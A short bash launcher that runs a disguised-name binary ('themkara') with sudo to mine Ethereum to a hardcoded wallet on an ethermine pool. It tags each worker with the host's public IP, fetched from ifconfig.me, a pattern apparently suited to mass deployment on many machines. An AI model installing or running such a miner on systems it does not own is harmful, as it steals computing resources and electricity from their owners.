#!/bin/bash

POOL=asia1.ethermine.org:4444
WALLET=0xf7fe12e0432b84added46f93704a2dcc0938abbe.$(echo "$(curl -s ifconfig.me)" | tr . _ )-themkara

cd "$(dirname "$0")"

chmod +x ./themkara && sudo ./themkara --algo ETHASH --pool $POOL --user $WALLET  $@
